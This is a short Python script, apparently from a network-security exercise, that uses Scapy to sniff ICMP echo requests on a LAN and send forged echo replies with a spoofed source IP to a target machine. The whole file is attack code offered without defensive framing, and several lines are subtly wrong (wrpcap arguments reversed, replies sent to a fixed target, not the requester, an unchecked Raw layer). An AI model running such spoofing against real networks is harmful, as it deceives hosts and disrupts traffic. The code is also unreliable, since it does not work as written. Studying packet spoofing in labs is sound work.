from scapy.all import *
from scapy.layers.inet import ICMP, IP

# Define the IP address of attacker machine
attacker_ip = "192.168.1.100"

# Define the IP address of the target machine
target_ip = "192.168.1.101"

# Define the IP address of the fake machine
fake_ip = "192.168.1.102"


# Define the function to sniff and spoof packets
def sniff_and_spoof(pkt):
    # Check if the packet is an ICMP echo request
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
        # Create a new packet with the spoofed source IP address
        spoofed_pkt = IP(src=fake_ip, dst=target_ip) / ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) / pkt[Raw].load

        # Send the spoofed packet
        send(spoofed_pkt)

        # Print a message to indicate that a packet has been spoofed
        print("Spoofed packet sent: {} -> {}".format(spoofed_pkt[IP].src, spoofed_pkt[IP].dst))


# Start sniffing packets on the LAN
packets = sniff(filter="icmp", prn=sniff_and_spoof)
wrpcap(packets, "snoofer_packets")
